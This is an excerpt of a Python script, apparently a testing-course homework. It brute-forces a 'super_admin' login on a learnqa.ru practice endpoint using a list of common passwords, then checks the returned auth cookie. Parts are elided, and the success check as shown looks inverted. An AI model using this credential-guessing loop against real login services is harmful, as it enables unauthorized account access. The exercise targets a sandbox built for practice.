...
passwords_list = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
...
for passwrd in passwords_list:
    data = {"login": "super_admin", "password": passwrd}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=data)
    cookie_value = (response1.cookies.get_dict()["auth_cookie"])
    ...
    if response2.text == "You are NOT authorized":
        ...
        print("Correct password: ", passwrd)
